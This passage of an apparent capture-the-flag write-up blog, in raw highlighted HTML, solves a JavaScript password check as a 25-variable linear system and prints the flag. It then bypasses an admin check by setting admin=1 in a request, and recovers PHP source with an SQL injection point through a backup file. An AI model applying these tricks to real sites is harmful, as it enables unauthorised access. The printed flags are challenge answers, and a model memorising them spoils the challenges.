class="number">245</span>, <span class="number">133</span>, <span class="number">22</span>, <span class="number">87</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">106</span>, <span class="number">82</span>, <span class="number">211</span>, <span class="number">252</span>, <span class="number">57</span>, <span class="number">66</span>, <span class="number">98</span>], [<span class="number">199</span>, <span class="number">48</span>, <span class="number">58</span>, <span class="number">221</span>, <span class="number">162</span>, <span class="number">57</span>, <span class="number">111</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">126</span>, <span class="number">43</span>, <span class="number">143</span>, <span class="number">225</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">141</span>, <span class="number">5</span>, <span class="number">233</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">204</span>, <span class="number">155</span>, <span class="number">141</span>], [<span class="number">212</span>, <span class="number">83</span>, <span class="number">219</span>, <span class="number">55</span>, <span class="number">132</span>, <span class="number">5</span>, <span class="number">153</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">134</span>, <span class="number">201</span>, <span class="number">255</span>, <span class="number">101</span>, <span class="number">22</span>, <span class="number">98</span>, <span class="number">215</span>, <span class="number">139</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">165</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">48</span>, <span class="number">119</span>], [<span class="number">194</span>, <span class="number">156</span>, <span class="number">10</span>, <span class="number">212</span>, <span class="number">237</span>, <span class="number">112</span>, <span class="number">17</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">227</span>, <span class="number">152</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">10</span>, <span class="number">238</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">31</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">180</span>, <span class="number">45</span>, <span class="number">94</span>], [<span class="number">110</span>, <span class="number">231</span>, <span class="number">82</span>, <span class="number">180</span>, <span class="number">109</span>, <span class="number">209</span>, <span class="number">239</span>, <span class="number">163</span>, <span class="number">30</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="number">190</span>, <span class="number">97</span>, <span class="number">256</span>, <span class="number">141</span>, <span class="number">199</span>, <span class="number">3</span>, <span class="number">30</span>, <span class="number">235</span>, <span class="number">73</span>, <span class="number">225</span>, <span class="number">244</span>, <span class="number">141</span>, <span class="number">123</span>, <span class="number">208</span>], [<span class="number">220</span>, <span class="number">248</span>, <span class="number">136</span>, <span class="number">245</span>, <span class="number">123</span>, <span class="number">82</span>, <span class="number">120</span>, <span class="number">65</span>, <span class="number">68</span>, <span class="number">136</span>, <span class="number">151</span>, <span class="number">173</span>, <span class="number">104</span>, <span class="number">107</span>, <span class="number">172</span>, <span class="number">148</span>, <span class="number">54</span>, <span class="number">218</span>, <span class="number">42</span>, <span class="number">233</span>, <span class="number">57</span>, <span class="number">115</span>, <span class="number">5</span>, <span class="number">50</span>, <span class="number">196</span>], [<span class="number">190</span>, <span class="number">34</span>, <span class="number">140</span>, <span class="number">52</span>, <span class="number">160</span>, <span class="number">34</span>, <span class="number">201</span>, <span class="number">48</span>, <span class="number">214</span>, <span class="number">33</span>, <span class="number">219</span>, <span class="number">183</span>, <span class="number">224</span>, <span class="number">237</span>, <span class="number">157</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">134</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">212</span>, <span class="number">230</span>, <span class="number">243</span>, <span class="number">236</span>, <span class="number">40</span>], [<span class="number">144</span>, <span class="number">246</span>, <span class="number">73</span>, <span class="number">161</span>, <span class="number">134</span>, <span class="number">112</span>, <span class="number">146</span>, <span class="number">212</span>, <span class="number">121</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">174</span>, <span class="number">146</span>, <span class="number">78</span>, <span class="number">235</span>, <span class="number">202</span>, <span class="number">200</span>, <span class="number">90</span>, <span class="number">254</span>, <span class="number">216</span>, <span class="number">113</span>, <span class="number">25</span>, <span class="number">114</span>, <span class="number">232</span>, <span class="number">123</span>], [<span class="number">158</span>, <span class="number">85</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">145</span>, <span class="number">21</span>, <span class="number">105</span>, <span class="number">2</span>, <span class="number">256</span>, <span class="number">69</span>, <span class="number">21</span>, <span class="number">152</span>, <span class="number">155</span>, <span class="number">88</span>, <span class="number">11</span>, <span class="number">232</span>, <span class="number">146</span>, <span class="number">238</span>, <span class="number">170</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">150</span>, <span class="number">161</span>, <span class="number">249</span>, <span class="number">236</span>], [<span class="number">251</span>, <span class="number">96</span>, <span class="number">103</span>, <span class="number">188</span>, <span class="number">188</span>, <span class="number">8</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">237</span>, <span class="number">63</span>, <span class="number">230</span>, <span class="number">128</span>, <span class="number">166</span>, <span class="number">130</span>, <span class="number">141</span>, <span class="number">112</span>, <span class="number">254</span>, <span class="number">234</span>, <span class="number">113</span>, <span class="number">250</span>, <span class="number">1</span>, <span class="number">89</span>, <span class="number">0</span>, <span class="number">135</span>, <span class="number">119</span>], [<span class="number">192</span>, <span class="number">206</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">174</span>, <span class="number">130</span>, <span class="number">164</span>, <span class="number">95</span>, <span class="number">21</span>, <span class="number">153</span>, <span class="number">82</span>, <span class="number">254</span>, <span class="number">20</span>, <span class="number">133</span>, <span class="number">56</span>, <span class="number">7</span>, <span class="number">163</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">206</span>, <span class="number">51</span>, <span class="number">204</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">196</span>], [<span class="number">106</span>, <span class="number">63</span>, <span class="number">252</span>, <span class="number">202</span>, <span class="number">153</span>, <span class="number">6</span>, <span class="number">193</span>, <span class="number">146</span>, <span class="number">88</span>, <span class="number">118</span>, <span class="number">78</span>, <span class="number">58</span>, <span class="number">214</span>, <span class="number">168</span>, <span class="number">68</span>, <span class="number">128</span>, <span class="number">68</span>, <span class="number">35</span>, <span class="number">245</span>, <span class="number">144</span>, <span class="number">102</span>, <span class="number">20</span>, <span class="number">194</span>, <span class="number">207</span>, <span class="number">66</span>], [<span class="number">154</span>, <span class="number">98</span>, <span class="number">219</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">131</span>, <span class="number">185</span>, <span class="number">27</span>, <span class="number">162</span>, <span class="number">214</span>, <span class="number">63</span>, <span class="number">238</span>, <span class="number">248</span>, <span class="number">38</span>, <span class="number">129</span>, <span class="number">170</span>, <span class="number">180</span>, <span class="number">181</span>, <span class="number">96</span>, <span class="number">165</span>, <span class="number">78</span>, <span class="number">121</span>, <span class="number">55</span>, <span class="number">214</span>], [<span class="number">193</span>, <span class="number">94</span>, <span class="number">107</span>, <span class="number">45</span>, <span class="number">83</span>, <span class="number">56</span>, <span class="number">2</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">169</span>, <span class="number">120</span>, <span class="number">58</span>, <span class="number">105</span>, <span class="number">178</span>, <span class="number">58</span>, <span class="number">217</span>, <span class="number">18</span>, <span class="number">93</span>, <span class="number">212</span>, <span class="number">74</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">219</span>, <span class="number">89</span>, <span class="number">212</span>], [<span class="number">164</span>, <span class="number">228</span>, <span class="number">5</span>, <span class="number">133</span>, <span class="number">175</span>, <span class="number">164</span>, <span class="number">37</span>, <span class="number">176</span>, <span class="number">94</span>, <span class="number">232</span>, <span class="number">82</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">212</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">153</span>, <span class="number">119</span>, <span class="number">85</span>, <span class="number">147</span>, <span class="number">256</span>, <span class="number">130</span>, <span class="number">248</span>, <span class="number">235</span>], [<span class="number">221</span>, <span class="number">178</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">215</span>, <span class="number">200</span>, <span class="number">188</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">172</span>, <span class="number">133</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">83</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">215</span>, <span class="number">204</span>, <span class="number">141</span>, <span class="number">226</span>, <span class="number">118</span>, <span class="number">233</span>, <span class="number">156</span>], [<span class="number">236</span>, <span class="number">142</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>, <span class="number">134</span>, <span class="number">54</span>, <span class="number">239</span>, <span class="number">49</span>, <span class="number">220</span>, <span class="number">233</span>, <span class="number">216</span>, <span class="number">13</span>, <span class="number">143</span>, <span class="number">145</span>, <span class="number">112</span>, <span class="number">217</span>, <span class="number">194</span>, <span class="number">114</span>, <span class="number">221</span>, <span class="number">150</span>, <span class="number">51</span>, <span class="number">136</span>, <span class="number">31</span>, <span class="number">198</span>]], n = <span class="number">0</span><span class="comment">; n &lt; 25; n++) &#123;</span></span><br><span class="line">                    for (<span class="name"><span class="builtin-name">var</span></span> i = <span class="number">0</span>,</span><br><span class="line">                    a = <span class="number">0</span><span class="comment">; a &lt; 25; a++) i += t[a] * o[n][a];</span></span><br><span class="line">                    if (<span class="name">i</span> !== r[n]) return ! <span class="number">1</span></span><br><span class="line">                &#125;</span><br><span class="line">                return ! <span class="number">0</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            key: <span class="string">"__handleTouchTap__REACT_HOT_LOADER__"</span>,</span><br><span class="line">            value: function() &#123;</span><br><span class="line">                var e = this.state.passcontent,</span><br><span class="line">                t = &#123;</span><br><span class="line">                    passowrd: e</span><br><span class="line">                &#125;<span class="comment">;</span></span><br><span class="line">                self = this,</span><br><span class="line">                $.post(<span class="string">"checkpass.json"</span>, t,</span><br><span class="line">                function(<span class="name">t</span>) &#123;</span><br><span class="line">                    self.checkpass(<span class="name">e</span>) ? self.setState(&#123;</span><br><span class="line">                        errmsg: <span class="string">"Success!!"</span>,</span><br><span class="line">                        errcolor: b.green400</span><br><span class="line">                    &#125;) : (<span class="name">self.setState</span>(&#123;</span><br><span class="line">                        errmsg: <span class="string">"Wrong Password!!"</span>,</span><br><span class="line">                        errcolor: b.red400</span><br><span class="line">                    &#125;), setTimeout(<span class="name">function</span>() &#123;</span><br><span class="line">                        self.setState(&#123;</span><br><span class="line">                            errmsg: <span class="string">""</span></span><br><span class="line">                        &#125;)</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="number">3</span>e3))</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>是个25元一次方程，求解</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf<span class="number">-8</span> -*-</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">a = np.array([<span class="number">325799</span>, <span class="number">309234</span>, <span class="number">317320</span>, <span class="number">327895</span>, <span class="number">298316</span>, <span class="number">301249</span>, <span class="number">330242</span>, <span class="number">289290</span>, <span class="number">273446</span>, <span class="number">337687</span>, <span class="number">258725</span>, <span class="number">267444</span>, <span class="number">373557</span>, <span class="number">322237</span>, <span class="number">344478</span>, <span class="number">362136</span>, <span class="number">331815</span>, <span class="number">315157</span>, <span class="number">299242</span>, <span class="number">305418</span>, <span class="number">313569</span>, <span class="number">269307</span>, <span class="number">338319</span>, <span class="number">306491</span>, <span class="number">351259</span>])</span><br><span class="line">b = np.array([[<span class="number">11</span>, <span class="number">13</span>, <span class="number">32</span>, <span class="number">234</span>, <span class="number">236</span>, <span class="number">3</span>, <span class="number">72</span>, <span class="number">237</span>, <span class="number">122</span>, <span class="number">230</span>, <span class="number">157</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">225</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">142</span>, <span class="number">166</span>, <span class="number">11</span>, <span class="number">196</span>, <span class="number">194</span>, <span class="number">187</span>, <span class="number">152</span>, <span class="number">132</span>, <span class="number">135</span>], [<span class="number">76</span>, <span class="number">55</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">98</span>, <span class="number">244</span>, <span class="number">201</span>, <span class="number">125</span>, <span class="number">182</span>, <span class="number">123</span>, <span class="number">47</span>, <span class="number">86</span>, <span class="number">67</span>, <span class="number">19</span>, <span class="number">145</span>, <span class="number">12</span>, <span class="number">138</span>, <span class="number">149</span>, <span class="number">83</span>, <span class="number">178</span>, <span class="number">255</span>, <span class="number">122</span>, <span class="number">238</span>, <span class="number">187</span>, <span class="number">221</span>], [<span class="number">218</span>, <span class="number">233</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">151</span>, <span class="number">28</span>, <span class="number">150</span>, <span class="number">196</span>, <span class="number">79</span>, <span class="number">11</span>, <span class="number">150</span>, <span class="number">128</span>, <span class="number">52</span>, <span class="number">228</span>, <span class="number">189</span>, <span class="number">107</span>, <span class="number">219</span>, <span class="number">87</span>, <span class="number">90</span>, <span class="number">221</span>, <span class="number">45</span>, <span class="number">201</span>, <span class="number">14</span>, <span class="number">106</span>, <span class="number">230</span>], [<span class="number">30</span>, <span class="number">50</span>, <span class="number">76</span>, <span class="number">94</span>, <span class="number">172</span>, <span class="number">61</span>, <span class="number">229</span>, <span class="number">109</span>, <span class="number">216</span>, <span class="number">12</span>, <span class="number">181</span>, <span class="number">231</span>, <span class="number">174</span>, <span class="number">236</span>, <span class="number">159</span>, <span class="number">128</span>, <span class="number">245</span>, <span class="number">52</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">207</span>, <span class="number">145</span>, <span class="number">241</span>, <span class="number">196</span>, <span class="number">80</span>], [<span class="number">134</span>, <span class="number">145</span>, <span class="number">36</span>, <span class="number">255</span>, <span class="number">13</span>, <span class="number">239</span>, <span class="number">212</span>, <span class="number">135</span>, <span class="number">85</span>, <span class="number">194</span>, <span class="number">200</span>, <span class="number">50</span>, <span class="number">170</span>, <span class="number">78</span>, <span class="number">51</span>, <span class="number">10</span>, <span class="number">232</span>, <span class="number">132</span>, <span class="number">60</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">74</span>, <span class="number">117</span>, <span class="number">250</span>, <span class="number">45</span>], [<span class="number">142</span>, <span class="number">221</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">56</span>, <span class="number">120</span>, <span class="number">113</span>, <span class="number">143</span>, <span class="number">77</span>, <span class="number">190</span>, <span class="number">195</span>, <span class="number">133</span>, <span class="number">236</span>, <span class="number">111</span>, <span class="number">144</span>, <span class="number">65</span>, <span class="number">172</span>, <span class="number">74</span>, <span class="number">160</span>, <span class="number">1</span>, <span class="number">143</span>, <span class="number">242</span>, <span class="number">96</span>, <span class="number">70</span>, <span class="number">107</span>], [<span class="number">229</span>, <span class="number">79</span>, <span class="number">167</span>, <span class="number">88</span>, <span class="number">165</span>, <span class="number">38</span>, <span class="number">108</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">240</span>, <span class="number">116</span>, <span class="number">178</span>, <span class="number">165</span>, <span class="number">206</span>, <span class="number">156</span>, <span class="number">193</span>, <span class="number">86</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">187</span>, <span class="number">161</span>, <span class="number">55</span>, <span class="number">134</span>, <span class="number">24</span>, <span class="number">249</span>], [<span class="number">235</span>, <span class="number">175</span>, <span class="number">235</span>, <span class="number">169</span>, <span class="number">73</span>, <span class="number">125</span>, <span class="number">114</span>, <span class="number">6</span>, <span class="number">142</span>, <span class="number">162</span>, <span class="number">228</span>, <span class="number">157</span>, <span class="number">160</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">167</span>, <span class="number">63</span>, <span class="number">41</span>, <span class="number">182</span>, <span class="number">55</span>, <span class="number">189</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">31</span>, <span class="number">158</span>], [<span class="number">37</span>, <span class="number">190</span>, <span class="number">169</span>, <span class="number">116</span>, <span class="number">172</span>, <span class="number">66</span>, <span class="number">9</span>, <span class="number">229</span>, <span class="number">188</span>, <span class="number">63</span>, <span class="number">138</span>, <span class="number">111</span>, <span class="number">245</span>, <span class="number">133</span>, <span class="number">22</span>, <span class="number">87</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">106</span>, <span class="number">82</span>, <span class="number">211</span>, <span class="number">252</span>, <span class="number">57</span>, <span class="number">66</span>, <span class="number">98</span>], [<span class="number">199</span>, <span class="number">48</span>, <span class="number">58</span>, <span class="number">221</span>, <span class="number">162</span>, <span class="number">57</span>, <span class="number">111</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">126</span>, <span class="number">43</span>, <span class="number">143</span>, <span class="number">225</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">141</span>, <span class="number">5</span>, <span class="number">233</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">204</span>, <span class="number">155</span>, <span class="number">141</span>], [<span class="number">212</span>, <span class="number">83</span>, <span class="number">219</span>, <span class="number">55</span>, <span class="number">132</span>, <span class="number">5</span>, <span class="number">153</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">134</span>, <span class="number">201</span>, <span class="number">255</span>, <span class="number">101</span>, <span class="number">22</span>, <span class="number">98</span>, <span class="number">215</span>, <span class="number">139</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">165</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">48</span>, <span class="number">119</span>], [<span class="number">194</span>, <span class="number">156</span>, <span class="number">10</span>, <span class="number">212</span>, <span class="number">237</span>, <span class="number">112</span>, <span class="number">17</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">227</span>, <span class="number">152</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">10</span>, <span class="number">238</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">31</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">180</span>, <span class="number">45</span>, <span class="number">94</span>], [<span class="number">110</span>, <span class="number">231</span>, <span class="number">82</span>, <span class="number">180</span>, <span class="number">109</span>, <span class="number">209</span>, <span class="number">239</span>, <span class="number">163</span>, <span class="number">30</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="number">190</span>, <span class="number">97</span>, <span class="number">256</span>, <span class="number">141</span>, <span class="number">199</span>, <span class="number">3</span>, <span class="number">30</span>, <span class="number">235</span>, <span class="number">73</span>, <span class="number">225</span>, <span class="number">244</span>, <span class="number">141</span>, <span class="number">123</span>, <span class="number">208</span>], [<span class="number">220</span>, <span class="number">248</span>, <span class="number">136</span>, <span class="number">245</span>, <span class="number">123</span>, <span class="number">82</span>, <span class="number">120</span>, <span class="number">65</span>, <span class="number">68</span>, <span class="number">136</span>, <span class="number">151</span>, <span class="number">173</span>, <span class="number">104</span>, <span class="number">107</span>, <span class="number">172</span>, <span class="number">148</span>, <span class="number">54</span>, <span class="number">218</span>, <span class="number">42</span>, <span class="number">233</span>, <span class="number">57</span>, <span class="number">115</span>, <span class="number">5</span>, <span class="number">50</span>, <span class="number">196</span>], [<span class="number">190</span>, <span class="number">34</span>, <span class="number">140</span>, <span class="number">52</span>, <span class="number">160</span>, <span class="number">34</span>, <span class="number">201</span>, <span class="number">48</span>, <span class="number">214</span>, <span class="number">33</span>, <span class="number">219</span>, <span class="number">183</span>, <span class="number">224</span>, <span class="number">237</span>, <span class="number">157</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">134</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">212</span>, <span class="number">230</span>, <span class="number">243</span>, <span class="number">236</span>, <span class="number">40</span>], [<span class="number">144</span>, <span class="number">246</span>, <span class="number">73</span>, <span class="number">161</span>, <span class="number">134</span>, <span class="number">112</span>, <span class="number">146</span>, <span class="number">212</span>, <span class="number">121</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">174</span>, <span class="number">146</span>, <span class="number">78</span>, <span class="number">235</span>, <span class="number">202</span>, <span class="number">200</span>, <span class="number">90</span>, <span class="number">254</span>, <span class="number">216</span>, <span class="number">113</span>, <span class="number">25</span>, <span class="number">114</span>, <span class="number">232</span>, <span class="number">123</span>], [<span class="number">158</span>, <span class="number">85</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">145</span>, <span class="number">21</span>, <span class="number">105</span>, <span class="number">2</span>, <span class="number">256</span>, <span class="number">69</span>, <span class="number">21</span>, <span class="number">152</span>, <span class="number">155</span>, <span class="number">88</span>, <span class="number">11</span>, <span class="number">232</span>, <span class="number">146</span>, <span class="number">238</span>, <span class="number">170</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">150</span>, <span class="number">161</span>, <span class="number">249</span>, <span class="number">236</span>], [<span class="number">251</span>, <span class="number">96</span>, <span class="number">103</span>, <span class="number">188</span>, <span class="number">188</span>, <span class="number">8</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">237</span>, <span class="number">63</span>, <span class="number">230</span>, <span class="number">128</span>, <span class="number">166</span>, <span class="number">130</span>, <span class="number">141</span>, <span class="number">112</span>, <span class="number">254</span>, <span class="number">234</span>, <span class="number">113</span>, <span class="number">250</span>, <span class="number">1</span>, <span class="number">89</span>, <span class="number">0</span>, <span class="number">135</span>, <span class="number">119</span>], [<span class="number">192</span>, <span class="number">206</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">174</span>, <span class="number">130</span>, <span class="number">164</span>, <span class="number">95</span>, <span class="number">21</span>, <span class="number">153</span>, <span class="number">82</span>, <span class="number">254</span>, <span class="number">20</span>, <span class="number">133</span>, <span class="number">56</span>, <span class="number">7</span>, <span class="number">163</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">206</span>, <span class="number">51</span>, <span class="number">204</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">196</span>], [<span class="number">106</span>, <span class="number">63</span>, <span class="number">252</span>, <span class="number">202</span>, <span class="number">153</span>, <span class="number">6</span>, <span class="number">193</span>, <span class="number">146</span>, <span class="number">88</span>, <span class="number">118</span>, <span class="number">78</span>, <span class="number">58</span>, <span class="number">214</span>, <span class="number">168</span>, <span class="number">68</span>, <span class="number">128</span>, <span class="number">68</span>, <span class="number">35</span>, <span class="number">245</span>, <span class="number">144</span>, <span class="number">102</span>, <span class="number">20</span>, <span class="number">194</span>, <span class="number">207</span>, <span class="number">66</span>], [<span class="number">154</span>, <span class="number">98</span>, <span class="number">219</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">131</span>, <span class="number">185</span>, <span class="number">27</span>, <span class="number">162</span>, <span class="number">214</span>, <span class="number">63</span>, <span class="number">238</span>, <span class="number">248</span>, <span class="number">38</span>, <span class="number">129</span>, <span class="number">170</span>, <span class="number">180</span>, <span class="number">181</span>, <span class="number">96</span>, <span class="number">165</span>, <span class="number">78</span>, <span class="number">121</span>, <span class="number">55</span>, <span class="number">214</span>], [<span class="number">193</span>, <span class="number">94</span>, <span class="number">107</span>, <span class="number">45</span>, <span class="number">83</span>, <span class="number">56</span>, <span class="number">2</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">169</span>, <span class="number">120</span>, <span class="number">58</span>, <span class="number">105</span>, <span class="number">178</span>, <span class="number">58</span>, <span class="number">217</span>, <span class="number">18</span>, <span class="number">93</span>, <span class="number">212</span>, <span class="number">74</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">219</span>, <span class="number">89</span>, <span class="number">212</span>], [<span class="number">164</span>, <span class="number">228</span>, <span class="number">5</span>, <span class="number">133</span>, <span class="number">175</span>, <span class="number">164</span>, <span class="number">37</span>, <span class="number">176</span>, <span class="number">94</span>, <span class="number">232</span>, <span class="number">82</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">212</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">153</span>, <span class="number">119</span>, <span class="number">85</span>, <span class="number">147</span>, <span class="number">256</span>, <span class="number">130</span>, <span class="number">248</span>, <span class="number">235</span>], [<span class="number">221</span>, <span class="number">178</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">215</span>, <span class="number">200</span>, <span class="number">188</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">172</span>, <span class="number">133</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">83</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">215</span>, <span class="number">204</span>, <span class="number">141</span>, <span class="number">226</span>, <span class="number">118</span>, <span class="number">233</span>, <span class="number">156</span>], [<span class="number">236</span>, <span class="number">142</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>, <span class="number">134</span>, <span class="number">54</span>, <span class="number">239</span>, <span class="number">49</span>, <span class="number">220</span>, <span class="number">233</span>, <span class="number">216</span>, <span class="number">13</span>, <span class="number">143</span>, <span class="number">145</span>, <span class="number">112</span>, <span class="number">217</span>, <span class="number">194</span>, <span class="number">114</span>, <span class="number">221</span>, <span class="number">150</span>, <span class="number">51</span>, <span class="number">136</span>, <span class="number">31</span>, <span class="number">198</span>]])</span><br><span class="line">x = np.linalg.solve(b,a)</span><br><span class="line">print x</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">for i in x:</span><br><span class="line">    flag += chr(int(round(i)))</span><br><span class="line">print flag</span><br><span class="line">#<span class="symbol">QWB</span>&#123;<span class="symbol">R3ac7_1s_interesting</span>&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="61dctf-admin"><a href="#61dctf-admin" class="headerlink" title="[61dctf]admin"></a>[61dctf]admin</h1><p>题目入口：<a href="http://web.jarvisoj.com:32792/" target="_blank" rel="noopener">http://web.jarvisoj.com:32792/</a></p>
<ol>
<li>访问robots.txt发现admin_s3cr3t.php<blockquote>
<p>flag{hello guest}</p>
</blockquote>
</li>
<li>妈的居然是假的</li>
<li>抓包admin=1<blockquote>
<p>flag{hello_admin~}</p>
</blockquote>
</li>
</ol>
<h1 id="61dctf-inject"><a href="#61dctf-inject" class="headerlink" title="[61dctf]inject"></a>[61dctf]inject</h1><p>题目入口：<a href="http://web.jarvisoj.com:32794/" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/</a></p>
<blockquote>
<p>Hint1: 先找到源码再说吧~~</p>
</blockquote>
<ol>
<li><p>/index.php~找到源码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">require</span>(<span class="string">"config.php"</span>);</span></span><br><span class="line"><span class="php">$table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span></span><br><span class="line"><span class="php"><span class="comment">#当未输入table参数时，table的值默认为test;当输入了table的参数时，table的值为输入的值</span></span></span><br><span class="line"><span class="php">$table = Filter($table);</span></span><br><span class="line"><span class="php">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span></span><br><span class="line"><span class="php">$sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span></span><br><span class="line"><span class="php">$ret = sql_query($sql);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>先看一下这个desc</p>
<blockquote>
<p>desc table是显示数据表的表都定义了哪些字段，及各个字段的类型大小，及哪些是主键，哪些有约束条件，以及各个字段是否定义了默认值</p>
</blockquote>
</li>
<li><p>下面本地测试一下</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"><span class="code">+----------------+</span></span><br><span class="line">| Tables<span class="emphasis">_in_</span>test |</span><br><span class="line"><span class="code">+----------------+</span></span><br><span class="line">| liuyan         |</span><br><span class="line">| test1          |</span><br><span class="line">| test2          |</span><br><span class="line">| users          |</span><br><span class="line"><span class="code">+----------------+</span></span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span 